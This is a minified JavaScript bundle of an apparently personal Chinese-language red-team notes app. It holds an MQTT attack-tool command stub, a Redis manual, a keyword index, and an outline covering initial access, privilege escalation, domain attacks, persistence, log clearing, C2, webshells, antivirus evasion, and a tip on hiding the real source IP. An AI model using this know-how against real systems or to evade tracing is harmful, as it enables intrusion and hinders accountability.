                  scans  -i  <\u626B\u63CF\u7684ID>
                      \uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                  \u76F8\u5173\u5B50\u547D\u4EE4\uFF1A

                          messages
                              \u9700\u8981\u5148\u8FDB\u5165\u3010\u67D0\u4E2Ascan\u3011

                              messages
                                  \u663E\u793A\u3010\u6536\u5230\u6D88\u606F\u3011
                          owntracks
                              \u9700\u8981\u5148\u8FDB\u5165\u3010\u67D0\u4E2Ascan\u3011

                              owntracks
                                  \u663E\u793A \u3010\u7528\u6237 + \u8BBE\u5907 + \u5750\u6807\u3011 \u3002
                          topics
                              \u9700\u8981\u5148\u8FDB\u5165\u3010\u67D0\u4E2Ascan\u3011

                              topics
                                  \u663E\u793A\u3010\u8BA2\u9605\u901A\u9053 \u76F8\u5173\u3011


              \u5176\u5B83\u64CD\u4F5C
                  back
                      back  <scan\u6216victim>
                          \u8FD4\u56DE\u5230\u4E0A\u4E00\u7EA7
                  edit  <\u6587\u4EF6\u8DEF\u5F84>
                      \u5728\u3010\u653B\u51FB\u8005\u672C\u673A\u3011\u4E0A\uFF0C\u6253\u5F00\u7F16\u8F91\u4E00\u4E2A\u6587\u672C\u6587\u4EF6
                          \uFF08\u6CE8\u610F\uFF0C\u4E0D\u662F\u5728\u3010mqtt\u3011\u800C\u662F\u5728\u3010\u653B\u51FB\u8005\u672C\u673A\u3011\uFF09
                  shell  <\u547D\u4EE4>
                      \u5728\u3010\u653B\u51FB\u8005\u672C\u673A\u3011\uFF0C\u6267\u884Cshell\u547D\u4EE4

              exp\u5229\u7528\u64CD\u4F5C
                  commands
                      \uFF1F\uFF1F\uFF1F
                  exec
                      \uFF1F\uFF1F\uFF1F
                  victims
                      \uFF1F\uFF1F\uFF1F

          `))}]},wu=Fe,le=g.l.singleATag_blank,De={name:"\u3010Redis\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD\u548C\u4F7F\u7528",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
                  \u5B98\u7F51\uFF0C\u547D\u4EE4\u8BE6\u60C5\u67E5\u8BE2\uFF1Ahttps://redis.io/commands/?name=keys

          \u547D\u4EE4\u884C\u4F7F\u7528\uFF1A
                  info
                          \u67E5\u770B\u3010\u7CFB\u7EDF\u4FE1\u606F\u3011\u548C\u3010\u7EDF\u8BA1\u6570\u636E\u3011

                  select  <\u7D22\u5F15\u6570>
                          \u9009\u62E9\u67D0\u4E2A\u3010\u5B50\u6570\u636E\u5E93\u3011

                  SET  <\u952Ekey>  <\u503Cvalue>
                          \u8BBE\u7F6E\u67D0\u4E2A\u503C

                  GET  <\u952Ekey>
                          \u83B7\u53D6\u67D0\u4E2A\u503C

                  KEYS  <\u901A\u914D\u7B26_\u5982*_\u5982abc*_\u7B49>
                          \u83B7\u53D6\u6240\u6709\u7684key\u952E
          `))},{name:"\u8FDE\u63A5\u5DE5\u5177\uFF0C\u3010redis-cli\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5E38\u7528\u547D\u4EE4\uFF1A
                  \u8FDE\u63A5\uFF1A
                          redis-cli  -h  <\u4E3B\u673A\u540D>  -p  <\u7AEF\u53E3>  -a  <\u5BC6\u7801>

          `))}]},_e=De,ye={name:"\u7EA2\u961F/\u6253\u70B9/\u653B\u51FB/\u5BF9\u6297",steps:[{name:"\u4E00\u3001\u7B80\u4ECB / \u4E2A\u4EBA\u7684\u603B\u7ED3",steps:[{name:"\u7B80\u4ECB",content:e.a.createElement("pre",null,`
            \u6E17\u900F\u6D4B\u8BD5
            \u7EA2\u961F
            \u65E5\u5E38\u6D41\u7A0B\u7B80\u8981
                \u5165\u53E3\u6743\u9650 -> \u5185\u7F51\u641C\u96C6/\u63A2\u6D4B -> \u514D\u6740\u63D0\u6743 -> \u6293\u53D6\u767B\u5F55\u51ED\u8BC1 -> \u8DE8\u5E73\u53F0\u7684\u6A2A\u5411\u653B\u51FB -> \u5165\u53E3\u6743\u9650\u7EF4\u6301 -> \u96A7\u9053\u6570\u636E\u56DE\u4F20 -> \u5B9A\u671F\u6743\u9650\u7EF4\u6301
          `)},{name:"\u4E2A\u4EBA\u7684\u603B\u7ED3",content:e.a.createElement("pre",null,`
            \u4E09\u4E2A\u5DE5\u5177\uFF1AEhole\u3001kscan\u3001dismap
            oneforall
                    https://github.com/shmilylty/OneForAll
            awvs\u3001goby\u3001appscan\u3001nikto\u3001xray\u3001vulmap
            naabu.exe/httpx.exe/nuclei.exe/vscan.exe
            \u5728\u7EBF\u7F51\u7AD9


            \u53EA\u8981\u7528\u4E86\u4EE3\u7406\u6E17\u900F\u3001linux\u73AF\u5883\u4E0B\u7528proxychains\u90FD\u4F1A\u88AB\u6EAF\u6E90\u5230\u771F\u5B9EIP\u5730\u5740
                \u76EE\u524D\u552F\u4E00\u65B9\u6CD5\u5EFA\u8BAE\u5728windows\u73AF\u5883\u4E0B\u7528proxifier\u53EF\u4EE5\u6307\u5411\u6D41\u91CF\u65E0\u6CD5\u6EAF\u6E90
          `)}]},{name:"\u4E8C\u3001\u5165\u53E3\u6743\u9650\u83B7\u53D6",steps:[{name:"1\u3001\u5165\u53E3\u6743\u9650\u7684\u601D\u8DEF"},{name:"2\u3001\u5165\u53E3\u6743\u9650\u83B7\u53D6-\u670D\u52A1\u6846\u67B6\u4E2D\u95F4\u4EF6"},{name:"3\u3001\u5165\u53E3\u6743\u9650\u83B7\u53D6-winodws\u96C6\u6210\u73AF\u5883"},{name:"4\u3001\u5165\u53E3\u6743\u9650\u83B7\u53D6-\u5F00\u6E90\u7A0B\u5E8F"},{name:"5\u3001\u5165\u53E3\u6743\u9650\u83B7\u53D6-web\u7EC4\u4EF6"},{name:"6\u3001\u5165\u53E3\u6743\u9650-Getshell\u601D\u8DEF-\u5E38\u89C4\u7684web\u6F0F\u6D1E\u5229\u7528"},{name:"7\u3001\u5165\u53E3\u6743\u9650-\u8FB9\u754C\u7F51\u7EDC\u8BBE\u5907"}]},{name:"\u4E09\u3001\u5165\u53E3\u6743\u9650\u83B7\u53D6-GetShell",steps:[{name:"1\u3001TOP Port List",steps:[{name:"1\uFF09mssql"},{name:"2\uFF09SMB"},{name:"3\uFF09WMI"},{name:"4\uFF09winRM"},{name:"5\uFF09RDP"},{name:"6\uFF09oracle"},{name:"7\uFF09redis"},{name:"8\uFF09POSTgresql"},{name:"9\uFF09LDAP"},{name:"10\uFF09SMTP"},{name:"11\uFF09POP3"},{name:"12\uFF09IMAP"},{name:"13\uFF09Exchange"},{name:"14\uFF09VNC"},{name:"15\uFF09FTP"},{name:"16\uFF09RSync"},{name:"17\uFF09Mongodb"},{name:"18\uFF09telnet"}]},{name:"2\uFF09\u5165\u53E3\u6743\u9650-\u9493\u9C7C",steps:[{name:"1\uFF09\u53D1\u4FE1\u524D\u671F\u51C6\u5907"},{name:"2\uFF09\u5178\u578B\u7684\u6295\u9012\u65B9\u5F0F"}]},{name:"                 "}]},{name:"\u56DB\u3001\u4E3B\u673A\u5B89\u5168-\u63D0\u6743",steps:[{name:"1\u3001windows\u7CFB\u7EDF"},{name:"2\u3001linux\u73AF\u5883"},{name:"3\u3001\u7B2C\u4E09\u65B9\u670D\u52A1\u5668\u8F6F\u4EF6\u63D0\u6743"}]},{name:"\u4E94\u3001\u5185\u7F51\u5B89\u5168",steps:[{name:"1\u3001\u5185\u7F51\u5B89\u5168-\u654F\u611F\u4FE1\u606F\u6536\u96C6"},{name:"2\u3001\u4F9D\u9760EDR\u6765\u6355\u6349\u5404\u7C7B\u654F\u611F\u4FE1\u606F"},{name:"3\u3001\u5185\u7F51\u5173\u952E\u4E1A\u52A1\u7CFB\u7EDF\u679A\u4E3E"},{name:"4\u3001\u6F0F\u6D1E"},{name:"5\u3001\u5185\u7F51\u5B89\u5168-\u654F\u611F\u51ED\u8BC1"},{name:"6\u3001\u5185\u7F51\u5B89\u5168-\u96A7\u9053\u8F6C\u53D1"}]},{name:"\u516D\u3001\u5185\u7F51\u5B89\u5168-\u57DF",steps:[{name:"1\u3001\u4FE1\u606F\u6536\u96C6"},{name:"2\u3001\u5FEB\u901F\u83B7\u53D6\u57DF\u63A7\u6743\u9650\u7684\u65B9\u6CD5"},{name:"3\u3001\u57DF\u5185\u540E\u6E17\u900F-\u654F\u611F\u4FE1\u606F\u6536\u96C6"},{name:"4\u3001\u57DF\u5185\u6307\u5B9A\u767B\u5F55\u7684IP\u5B9A\u4F4D"},{name:"5\u3001\u57DF\u5185\u6307\u5B9A\u57DF\u63A7\u6280\u5DE7"},{name:"6\u3001\u57DF\u6743\u9650\u7EF4\u6301"}]},{name:"\u4E03\u3001\u5185\u7F51\u5B89\u5168-\u6A2A\u5411",steps:[{name:"1\u3001windows\u6A2A\u5411windows"},{name:"2\u3001win\u6A2A\u5411linx"},{name:"3\u3001linux\u6A2A\u5411win"},{name:"4\u3001linux\u6A2A\u5411linux"},{name:"5\u3001\u5404\u79CD\u8FDC\u7A0B\u4E0B\u8F7D\uFF1A"}]},{name:"\u516B\u3001\u6743\u9650\u7EF4\u6301",steps:[{name:"1\u3001\u8FB9\u754C\u5165\u53E3\u6743\u9650\u7EF4\u6301"},{name:"2\u3001win\u5355\u673A\u6743\u9650\u7EF4\u6301"},{name:"3\u3001linux\u6743\u9650\u7EF4\u6301"}]},{name:"\u4E5D\u3001\u5185\u7F51\u5B89\u5168-\u75D5\u8FF9\u6E05\u7406",steps:[{name:"1\u3001web\u65E5\u5FD7\uFF1A\u8BBF\u95EE\u3001\u62A5\u9519\u65E5\u5FD7"},{name:"2\u3001\u6570\u636E\u5E93\u65E5\u5FD7\uFF1A\u5F02\u5E38\u8FDE\u63A5\u65E5\u5FD7\u3001\u6162\u67E5\u8BE2\u65E5\u5FD7"},{name:"3\u3001\u5404\u7C7B\u5B89\u5168\u65E5\u5FD7\uFF1Assh\u3001rdp\u3001smb\u3001wmi\u3001powershell"},{name:"4\u3001\u90AE\u7BB1\u767B\u5F55\u65E5\u5FD7"},{name:"5\u3001\u57DF\u7684\u91D1\u94F6\u7968\u65E5\u5FD7"}]},{name:"\u5341\u3001C2",steps:[{name:"1\u3001CS-Cobalt Strike"},{name:"2\u3001MSF"},{name:"3\u3001payload beacon \u7EA2\u961F\u5DE5\u5177"}]},{name:"\u5341\u4E00\u3001WebShell\u5DE5\u5177",steps:[{name:"1\u3001\u83DC\u5200"},{name:"2\u3001\u51B0\u874E"},{name:"3\u3001\u8681\u5251"}]},{name:"\u5341\u4E8C\u3001\u514D\u6740-\u9632\u706B\u5899\u5BF9\u6297",steps:[{name:"1\u3001\u9759\u6001",steps:[{name:"1. \u6DF7\u6DC6"},{name:"2. \u52A0\u58F3"}]},{name:"2\u3001\u52A8\u6001",steps:[{name:"\u53CD\u5C04"}]},{name:"3\u3001\u6D41\u91CF",steps:[{name:"1\u3001\u57DF\u524D\u7F6E",steps:[{name:"CDN"}]},{name:"2\u3001DNS\u52A0\u5BC6\u96A7\u9053"},{name:"3\u3001tg\u5B98\u7F51\u5F15\u6D41"},{name:"4\u3001go\u5B98\u7F51\uFF08\u8BED\u8A00\u5B98\u7F51\uFF09"}]}]}]},ve=n("z0Yr"),Pe,Se,Me,xe,ke,Re,Ne,be,Ze,$e,qe,un,en,nn,tn,an,Fn,ln,En,rn,cn,on,sn,mn,Cn,Bn,An,Dn,dn,pn,_n,gn,hn,vn,fn,bn,On,yn,Pn,Sn,jn,xn,wn,Tn,In,Mn,Ln,kn,Rn,Nn,Wn,Hn,Un,Kn,Jn,zn,Vn,Gn,Xn,Qn,Yn,Zn,$n,qn,u0,e0,n0,t0,a0,F0,l0,E0,r0,Je,c0,i0=[Object(u.a)(Pe||(Pe=Object(t.a)([`
  \u3010\u7EA2\u961F\u3011\u3001\u3010\u62A4\u7F51\u7EA2\u961F\u3011
  \u3010\u6253\u70B9\u3011\u3001\u3010\u7EA2\u961F\u6253\u70B9\u3011\u3001

  `,`

  `])),ye),Object(u.a)(Se||(Se=Object(t.a)([`
  \u3010`,`\u3011\u3001\u30101111\u3011/*\u5FEB\u901F\u6C42\u63F4*/
  \u3010\u7EA2\u961F\u3011\u3001\u3010\u62A4\u7F51\u7EA2\u961F\u3011

  `,`
  `,`
  `,`
  `,`
  `,`
  `])),V.a.\u6E17\u900F\u6D4B\u8BD5,de.c,de.a,de.d,de.e,de.b),Object(u.a)(Me||(Me=Object(t.a)([`
  \u30101433\u3011\u3001
  \u3010SqlServer\u3011\u3001\u3010Sql Server\u3011\u3001\u3010sql-server\u3011\u3001
  \u3010MSSql\u3011\u3001\u3010MS Sql\u3011\u3001\u3010ms-sql\u3011
  `,`

  \u3010shell\u3011\u3001 \u3010Shell\u3011\u3001\u3010Reverse\u3011\u3001\u3010\u53CD\u5411\u3011\u3001\u3010\u53CD\u5411\u4EE3\u7406\u3011
  \u3010\u529F\u80FDshell\u3011
  \u3010netcat\u3011\u3001\u3010nc\u3011\u3001
  \u3010psexec\u3011\u3001
  \u3010winrm\u3011\u3001\u3010evil-winrm\u3011\u3001\u3010EvilWinrm\u3011
   `,`

  `])),Fu,du.Shell_ReverseShell_\u53CD\u5411\u4EE3\u7406_\u624B\u518C),Object(u.a)(xe||(xe=Object(t.a)([`
  \u3010\u7F51\u7EDC\u626B\u63CF\u3011\u3001\u3010\u7F51\u7EDC\u53D1\u73B0\u3011\u3001
  \u3010\u4E3B\u673A\u63A2\u6D4B\u3011\u3001\u3010\u7AEF\u53E3\u63A2\u6D4B\u3011\u3001\u3010\u4E3B\u673A\u53D1\u73B0\u3011\u3001\u3010C\u6BB5\u3011\u3001\u3010B\u6BB5\u3011\u3001

  \u3010nmap\u3011\u3001\u3010_nmap_\u3011\u3001
  `,`

   \u3010NetDiscover\u3011\u3001
  `,`

    \u3010MasScan\u3011
  `,`

  `])),E.Nmap_\u624B\u518C,I,w),Object(u.a)(ke||(ke=Object(t.a)([`
  \u3010\u626B\u63CF\u5668\u3011\u3001\u3010\u6F0F\u626B\u3011\u3001\u3010\u6F0F\u6D1E\u626B\u63CF\u5668\u3011\u3001

  \u3010Nikto\u3011
  `,`

    \u3010Nessus\u3011
  `,`

  `])),B,b),Object(u.a)(Re||(Re=Object(t.a)([`
  \u3010ping\u3011\u3001\u3010ping\u7C7B\u3011\u3001\u3010\u7C7Bping\u3011\u3001\u3010hping\u3011\u3001\u3010IP\u3011\u3001\u3010IPv6\u3011\u3001\u3010IP6\u3011\u3001\u3010atk6-alive6\u3011
  \u3010IP\u8DF3\u8F6C\u3011\u3001\u3010\u8DEF\u7531\u3011\u3001\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u3001\u3010\u7F51\u7EDC\u62D3\u6251\u3011\u3001\u3010\u62D3\u6251\u3011
  `,`

  `])),T),Object(u.a)(Ne||(Ne=Object(t.a)([`
  \u3010\u9632\u706B\u5899\u3011\u3001\u3010waf\u3011
  `,`

  `])),R.b),Object(u.a)(be||(be=Object(t.a)([`
  \u3010\u7AEF\u53E3\u3011\u3001\u3010\u672A\u77E5\u7AEF\u53E3\u3011\u3001\u3010\u5E38\u7528\u7AEF\u53E3\u3011\u3001\u3010port\u3011
  `,`


  `])),f),Object(u.a)(Ze||(Ze=Object(t.a)([`
  \u3010FTP\u3011\u3001\u3010SFTP\u3011\u3001\u3010filezilla\u3011\u3001\u3010vsftpd\u3011\u3001\u301021\u3011\u3001\u301020\u3011
  `,`


  `])),P.FTP_\u624B\u518C),Object(u.a)($e||($e=Object(t.a)([`
  \u3010CIFS\u3011
  \u3010139\u3011\u3001\u3010SMB\u3011\u3001\u3010netbios\u3011\u3001\u3010netbios-ssn\u3011\u3001\u3010smbd\u3011
  \u3010445\u3011\u3001\u3010SMB\u3011\u3001\u3010ds\u3011\u3001\u3010microsoft-ds\u3011\u3001\u3010smbd\u3011
  `,`


  \u300ACIFS\u300B\uFF1A\u5168\u79F0 Common Internet File System
      \u5E38\u7528\u7AEF\u53E3\uFF1A3020\u3002

  `])),M),Object(u.a)(qe||(qe=Object(t.a)([`
  \u3010RDP\u3011\u3001
  \u30103389\u3011\u3001\u3010ms-wbt-server\u3011
  \u3010MsTsc\u3011\u3001

  MsTsc
      \u6211\u8FD8\u4E0D\u77E5\u9053\u8FD9\u4E2A\u662F\u4EC0\u4E48\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F
          \u53CD\u6B63\u548CWindows\u767B\u5F55 RDP \u6709\u5173\u7684\u3002
      Microsoft terminal services client
          \u5176\u5B9E\uFF0C\u5C31\u662F\u3010MsTsc\u8FDC\u7A0B\u684C\u9762\u8FDE\u63A5\u3011\u7684\u5DE5\u5177
          \u7F16\u8F91\u73B0\u6709\u201C\u8FDC\u7A0B\u684C\u9762\u8FDE\u63A5(.rdp)\u201D\u914D\u7F6E\u6587\u4EF6


  `,`


  `])),q),Object(u.a)(un||(un=Object(t.a)([`
  \u3010RPC\u3011\u3001
  \u3010135\u3011\u3001\u3010msrpc\u3011
  `,`

  \u8FDC\u7A0B\u8FC7\u7A0B\u8C03\u7528 RPC
      \u652F\u6301 Windows \u5E94\u7528\u7A0B\u5E8F\u4E4B\u95F4\u7684\u901A\u4FE1
      \u5B9E\u73B0\u4E86 RPC \u534F\u8BAE
          \u4E00\u79CD\u4F4E\u7EA7\u7684\u8FDB\u7A0B\u95F4\u901A\u4FE1\u5F62\u5F0F\uFF0C\u5176\u4E2D\u5BA2\u6237\u7AEF\u8FDB\u7A0B\u53EF\u4EE5\u5411\u670D\u52A1\u5668\u8FDB\u7A0B\u53D1\u51FA\u8BF7\u6C42

  Microsoft \u7684\u57FA\u7840 COM \u548C DCOM \u6280\u672F\u5EFA\u7ACB\u5728 RPC \u4E4B\u4E0A
      \u670D\u52A1\u7684\u540D\u79F0\u662F RpcSs\uFF0C\u5B83\u5728\u5171\u4EAB\u670D\u52A1\u4E3B\u673A\u8FDB\u7A0B svchost.exe \u4E2D\u8FD0\u884C\u3002

  `])),z),Object(u.a)(en||(en=Object(t.a)([`
  \u3010RMI\u3011

  `,`

  `])),z),Object(u.a)(nn||(nn=Object(t.a)([`
  \u30106789\u3011
  \u30108080\u3011
  \u30108443\u3011

  \u3010JNDI\u3011\u3001\u3010LDAP\u3011
  `,"  ",`



  6789
  ibm-db2-admin?

  8080
  http-proxy

  8443
  ssl/nagios-nsca
  Nagios NSCA


  \u76F8\u5173CMS\uFF1A
      UniFi / UniFi Network

  `,`

  `,`

  `,`

  `,`


  x_shadow
      \u65E0\u6CD5\u89E3\u5F00
      \u6211\u4EEC\u81EA\u5DF1\u521B\u5EFA\u3001\u81EA\u5DF1\u66FF\u6362\u4E00\u4E2A


  `])),Mu,ju,gu.a,Nu,Ku,$.Linux_Unix_\u624B\u518C),Object(u.a)(tn||(tn=Object(t.a)([`
  \u3010http\u3011\u3001\u301080\u3011\u3001\u3010https\u3011\u3001\u3010443\u3011\u3001
  \u3010HTTPAPI\u3011\u3001\u3010Microsoft HTTPAPI\u3011\u3001
  `,"  ","  ",`

  \u3010Enum\u3011\u3001\u3010\u679A\u4E3E\u3011\u3001
  \u3010\u8BCD\u5178\u3011\u3001\u3010\u5B57\u5178\u3011\u3001\u3010Dict\u3011\u3001\u3010List\u3011\u3001\u3010SecList\u3011
  \u3010dir\u3011\u3001\u3010directory\u3011\u3001\u3010\u76EE\u5F55\u3011
  `,`

  \u3010busting\u3011\u3001\u3010\u66B4\u529B\u3011\u3001\u3010\u66B4\u529B\u7834\u89E3\u3011\u3001\u3010bust\u3011\u3001\u3010buster\u3011  /  \u3010\u86EE\u529B\u3011\u3001\u3010brute\u3011\u3001\u3010bruting\u3011  /  \u3010force\u3011  /  \u3010gobuster\u3011  /  \u3010\u7206\u7834\u3011\u3001
  `,`
  \u3010hash\u3011\u3001\u3010md5\u3011
  \u3010John The Ripper\u3011\u3001\u3010John\u3011\u3001\u3010hashcat\u3011\u3001
  `,"  ",`

  `])),X,Pu,eu,Ju.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C,V.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u5BC6\u7801_\u53CA\u7834\u89E3,Pu,Ju.\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C),Object(u.a)(an||(an=Object(t.a)([`
  \u3010fuzz\u3011\u3001\u3010\u6A21\u7CCA\u3011\u3001\u3010\u6A21\u7CCA\u6D4B\u8BD5\u3011

  `,`
  `])),au),Object(u.a)(Fn||(Fn=Object(t.a)([`
  \u3010\u4FE1\u606F\u3011\u3001\u3010\u6536\u96C6\u3011\u3001\u3010\u4FE1\u606F\u6536\u96C6\u3011\u3001\u3010Information\u3011\u3001\u3010collect\u3011
  `,`


  `])),yu),Object(u.a)(ln||(ln=Object(t.a)([`
  \u3010sql\u3011\u3001\u3010\u6CE8\u5165\u3011\u3001
  \u30103306\u3011\u3001
  \u3010MariaDB\u3011\u3001
  `,`


  sql\u6CE8\u5165

  \u53E6\u4E00\u79CD\u8BF4\u6CD5\uFF0Cluck-based method  \u770B\u8FD0\u6C14\u7684\u65B9\u6CD5
      brute-forcing  \u66B4\u529B\u7834\u89E3

  404

  `])),Fu),Object(u.a)(En||(En=Object(t.a)([`
  \u3010PII\u3011\u3001\u3010iden\u3011\u3001\u3010information\u3011

  \u7B2C\u4E8C\u79CD\u65B9\u5F0F
      PII
          personally identifiable information\uFF0C\u4E2A\u4EBA\u8EAB\u4EFD\u4FE1\u606F
  `]))),Object(u.a)(rn||(rn=Object(t.a)([`
  \u301022\u3011\u3001\u3010OpenSSH\u3011\u3001\u3010ssh\u3011
  \u301023\u3011\u3001\u3010telnet\u3011
  `,`

  `])),Vu.SSH_Telnet_\u624B\u518C),Object(u.a)(cn||(cn=Object(t.a)([`
  \u3010SSTI\u3011\u3001
  \u3010\u6A21\u677F\u3011\u3001\u3010template\u3011\u3001\u3010engine\u3011\u3001\u3010expression\u3011
  \u3010HandleBars\u3011\u3001
  \u3010JSP\u3011\u3001
  `,`


  \u3010BurpSuite\u3011\u3001\u3010BP\u3011\u3001\u3010Burp\u3011\u3001
  \uFF08\u653E\u5728\u8FD9\u91CC\u662F\u5E72\u561B\uFF1F\u6211\u611F\u89C9\u5173\u8054\u4E0D\u5927\uFF09
  `,`


  `])),Ie.SSTI_\u6A21\u677F\u6CE8\u5165_\u6A21\u677F\u6E32\u67D3_\u6A21\u677F\u5F15\u64CE_\u624B\u518C,eu),Object(u.a)(on||(on=Object(t.a)([`
  \u3010Velocity\u3011
  \u3010\u6A21\u677F\u3011\u3001\u3010template\u3011\u3001


  `,`

  `])),Ie.SSTI_\u6A21\u677F\u6CE8\u5165_\u6A21\u677F\u6E32\u67D3_\u6A21\u677F\u5F15\u64CE_\u624B\u518C),Object(u.a)(sn||(sn=Object(t.a)([`
  \u3010CIA\u3011

  triad
      \u4E09\u5408\u4F1A
      \u4E09\u548C\u5F26

  Confidentiality, integrity and availability
      \u4FDD\u5BC6\u6027\u3001\u5B8C\u6574\u6027\u3001\u53EF\u7528\u6027
      CIA\u4E09\u539F\u5219\u3001CIA\u4E09\u5143\u7EC4

  `]))),Object(u.a)(mn||(mn=Object(t.a)([`
  \u3010Linux\u3011\u3001\u3010Unix\u3011
  \u3010cmd\u3011\u3001\u3010command\u3011\u3001\u3010grep\u3011\u3001\u3010find\u3011\u3001\u3010xargs\u3011
  \u3010Docker\u3011
  `,"  ",`

  `])),$.Linux_Unix_\u624B\u518C,se),Object(u.a)(Cn||(Cn=Object(t.a)([`
  \u3010Windows\u3011\u3001\u3010\u3010Windows Server\u3011
  \u3010cmd\u3011\u3001\u3010powershell\u3011
  \u3010psexec\u3011
  `,`

  Windows NT
      Windows New Technology

  `])),Q.Windows_\u624B\u518C),Object(u.a)(Bn||(Bn=Object(t.a)([`
  \u3010XSS\u3011
  `,`

  Cross-Site-Script




  `])),Su),Object(u.a)(An||(An=Object(t.a)([`
  \u3010\u8D8A\u6743\u3011\u3001\u3010Broken Access Control\u3011
  \u3010\u6C34\u5E73\u8D8A\u6743\u3011\u3001\u3010Horizontal\u3011\u3001\u3010Horizontal access control\u3011
  \u3010\u5782\u76F4\u8D8A\u6743\u3011\u3001\u3010Vertical\u3011\u3001\u3010Vertical access control\u3011
  \u3010\u4E0A\u4E0B\u6587\u3011\u3001\u3010\u4E0A\u4E0B\u6587\u76F8\u5173\u3011\u3001\u3010\u4E0A\u4E0B\u6587\u76F8\u5173\u8D8A\u6743\u3011\u3001\u3010Context\u3011
  \u3010\u672A\u6388\u6743\u3011\u3001\u3010Unauthorized\u3011
  \u3010Privilege\u3011
  `,`

  \u53C2\u8003\u8D44\u6599\uFF1A
      https://portswigger.net/web-security/access-control


  OAuth\u6388\u6743

  `])),lu),Object(u.a)(Dn||(Dn=Object(t.a)([`
  \u3010\u4E0A\u4F20\u3011\u3001\u3010\u6587\u4EF6\u4E0A\u4F20\u3011\u3001\u3010upload\u3011
  `,`

  `])),Du),Object(u.a)(dn||(dn=Object(t.a)([`
  \u3010\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u3011\u3001\u3010\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u3011

  `,`

  `])),Le),Object(u.a)(pn||(pn=Object(t.a)([`
  \u3010\u6743\u9650\u3011\u3001\u3010\u63D0\u5347\u3011\u3001\u3010\u6743\u9650\u63D0\u5347\u3011\u3001\u3010\u63D0\u5347\u6743\u9650\u3011\u3001\u3010\u63D0\u6743\u3011
  \u3010Privilege Escalation\u3011\u3001\u3010Privilege\u3011\u3001\u3010Escalation\u3011
  \u3010sudo\u3011\u3001\u3010suid\u3011\u3001\u3010vi\u3011\u3001\u3010Mongo\u3011\u3001\u3010lxd\u3011\u3001


  `,`

  `])),pe.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),Object(u.a)(_n||(_n=Object(t.a)([`
  \u3010\u5185\u7F51\u6E17\u900F\u3011
  \u3010CobaltStrike\u3011\u3001\u3010CS\u3011


  `,`

  `])),pe.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),Object(u.a)(gn||(gn=Object(t.a)([`
  \u3010UDP\u3011
  \u301069\u3011\u3001
  \u3010TFTP\u3011\u3001\u3010tftpd-hpa\u3011
  `,`


  `])),_u),Object(u.a)(hn||(hn=Object(t.a)([`
  \u3010\u793E\u4F1A\u5DE5\u7A0B\u5B66\u3011\u3001\u3010\u5FC3\u7406\u5B66\u3011\u3001\u3010Social\u3011\u3001\u3010Social Engine\u3011\u3001\u3010Social Engineering\u3011
  \u3010\u4EBA\u3011\u3001\u3010\u4EBA\u7684\u56E0\u7D20\u3011
  `,`

  `,`



  `])),V.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u5BC6\u7801_\u53CA\u7834\u89E3,zu),Object(u.a)(vn||(vn=Object(t.a)([`
  \u3010API\u3011\u3001\u3010\u63A5\u53E3\u3011\u3001
  \u3010\u7528\u6237\u8F93\u5165\u3011\u3001\u3010input\u3011

  \u4ECE\u7B80\u5355\u5230\u96BE\uFF0C\u6392\u5217\uFF1A
      \u6CE8\u5165\uFF1A
          XSS
          SQL
      \u903B\u8F91\u6F0F\u6D1E

  `]))),Object(u.a)(fn||(fn=Object(t.a)([`
  \u3010Metasploit\u3011\u3001\u3010msf\u3011\u3001\u3010msfconsole\u3011\u3001\u3010msfvenom\u3011
  `,`

  `])),nu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C),Object(u.a)(bn||(bn=Object(t.a)([`
  \u3010k8s\u3011\u3001\u3010docker\u3011\u3001\u3010lxd\u3011\u3001

  `,`


  k8s
      https://t.zsxq.com/vJuN37q

  `])),pe.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),Object(u.a)(On||(On=Object(t.a)([`
  \u3010Rust\u3011


  Rust shellcode\u52A0\u8F7D\u5668\uFF1A
      \u76F8\u5173\u8D44\u6599\uFF1Ahttps://github.com/HuskyHacks/RustyProcessInjectors/tree/master/EnumSystemGeoID

  rust \u505A C2
      \u76F8\u5173\u8D44\u6599\uFF1Ahttps://t.zsxq.com/2RNbqzn

  `]))),Object(u.a)(yn||(yn=Object(t.a)([`
  \u3010\u57DF\u3011\u3001\u3010domain\u3011\u3001\u3010\u57DF\u63A7\u3011\u3001\u3010Domain Controller\u3011\u3001\u3010DC\u3011
  \u3010kerberos\u3011\u3001
          \u3010Mimikatz\u3011\u3001\u3010\u9EC4\u91D1\u7968\u636E\u3011\u3001\u3010\u767D\u94F6\u7968\u636E\u3011\u3001
  \u3010BloodBound\u3011\u3001


  Kerberos  \uFF08\u5E38\u7528\u573A\u666F\uFF1AMimikatz\u3001\uFF09

      \u57FA\u672C\u4ECB\u7ECD\uFF1A
          \u901A\u4FD7\u6613\u61C2\uFF0C\u79D1\u666E\u7684\u8D44\u6599\uFF1A
              \u4E00\u6587\u641E\u5B9AKerberos - tkanng\u7684\u6587\u7AE0 - \u77E5\u4E4E    https://zhuanlan.zhihu.com/p/266491528
